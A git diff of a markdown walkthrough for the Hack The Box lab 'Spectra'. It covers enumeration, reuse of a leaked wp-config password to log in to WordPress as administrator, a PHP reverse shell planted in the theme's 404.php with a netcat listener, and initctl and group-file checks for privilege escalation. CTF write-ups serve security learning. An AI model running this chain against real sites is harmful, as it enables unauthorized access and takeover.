@@ -71,12 +71,23 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Sat Jun  7 14:33:44 2025 -- 1 IP address (1 host up) scanned in 38.78 seconds
 ```
 
-```bash
-grep -i spectra nmap/spectra.nmap
+Visiting the `http://10.129.240.86/` webpage
 
-# Subdomains discovery
-# ffuf ...
+```bash
+# Webpage source code
+<h1>Issue Tracking</h1>
+
+<h2>Until IT set up the Jira we can configure and use this for issue tracking.</h2>
+
+<h2><a href="http://spectra.htb/main/index.php" target="mine">Software Issue Tracker</a></h2>
+<h2><a href="http://spectra.htb/testing/index.php" target="mine">Test</a></h2>
 ```
+
+`http://spectra.htb/main/` is a WordPress site.
+
+`http://spectra.htb/testing/index.php` has an error:
+
+- **Error establishing a database connection**
 
 Add the found values to the `/etc/hosts` file
 
@@ -89,25 +100,6 @@ sudo sh -c 'echo "10.129.240.86 spectra.htb" >> /etc/hosts' && ping -c 3 spectra
 sudo sed -i '$ d' /etc/hosts
 ```
 
-Visiting the `http://10.129.240.86/` webpage
-
-```bash
-# Webpage source code
-<h1>Issue Tracking</h1>
-
-<h2>Until IT set up the Jira we can configure and use this for issue tracking.</h2>
-
-<h2><a href="http://spectra.htb/main/index.php" target="mine">Software Issue Tracker</a></h2>
-<h2><a href="http://spectra.htb/testing/index.php" target="mine">Test</a></h2>
-
-```
-
-`http://spectra.htb/main/` is a WordPress site.
-
-`http://spectra.htb/testing/index.php` has an error:
-
-- **Error establishing a database connection**
-
 
 
 Run `ffuf` to find the directories of the web server.
@@ -118,11 +110,8 @@ ffuf -u http://spectra.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt
 
 ```bash
                         [Status: 200, Size: 283, Words: 22, Lines: 7, Duration: 42ms]
-                        
 index.html              [Status: 200, Size: 283, Words: 22, Lines: 7, Duration: 33ms]
-
 main                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 34ms]
-
 testing                 [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 34ms]
 ```
 
@@ -165,8 +154,8 @@ wget -r -np -nH --cut-dirs=1 -P testing/ http://spectra.htb/testing/
 
 ```bash
 grep -Ri administrator testing
-grep -Ri password testing
 # nothing important
+grep -Ri password testing
 
 cat testing/wp-config.php.save
 ```
@@ -183,13 +172,13 @@ mysql -h spectra.htb -P 3306 -u devtest -p
 # ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '10.10.14.5' is not allowed to connect to this MySQL server
 ```
 
-Let's try the same password for the `administrator` user at the login page `http://spectra.htb/main/wp-login.php`
+Try the same password for the `administrator` user at the login page:
+
+`http://spectra.htb/main/wp-login.php`
 
 - it works with `administrator:devteam01`
 
-
-
-Let's run a `WpScan`
+Run a `WpScan` (just for fun)
 
 ```bash
 mkdir wpscan
@@ -324,7 +313,11 @@ $port = 1234;
 # Copy all the content and paste in the 404.php
 ```
 
-Once the `404.php` file is updated with the reverse shell code, start a netcat listener on the attacker machine to receive the incoming connection. Access the modified `404.php` page by navigating to the appropriate URL, such as `http://spectra.htb/main/wp-content/themes/twentynineteen/404.php`, which will trigger the reverse shell.
+Once the `404.php` file is updated with the reverse shell code, start a netcat listener on the attacker machine to receive the incoming connection. Access the modified `404.php` page by navigating to the appropriate URL, such as 
+
+`http://spectra.htb/main/wp-content/themes/twentynineteen/404.php`
+
+which will trigger the reverse shell.
 
 ```bash
 rlwrap nc -nvlp 1234
@@ -379,14 +372,12 @@ cat: /etc/wireless-regdb: Is a directory
 ```
 
 ```bash
-python3 -c 'import pty; pty.spawn("/bin/bash")'
+ls -lah /opt
+
+cat /opt/autologin.conf.orig
 ```
 
 ```bash
-ls -lah /opt
-
-cat /opt/autologin.conf.orig 
-
 # Copyright 2016 The Chromium OS Authors. All rights reserved.
 # Use of this source code is governed by a BSD-style license that can be
 # found in the LICENSE file.
@@ -471,11 +462,11 @@ User katie may run the following commands on spectra:
 
 ```bash
 sudo /sbin/initctl list
-
-find / -type f -group developers 2>/dev/null -ls
 ```
 
 ```bash
+find / -type f -group developers 2>/dev/null -ls
+
 ls -lah /etc/init/test.conf 
 -rw-rw---- 1 root developers 478 Jun 29  2020 /etc/init/test.conf
 
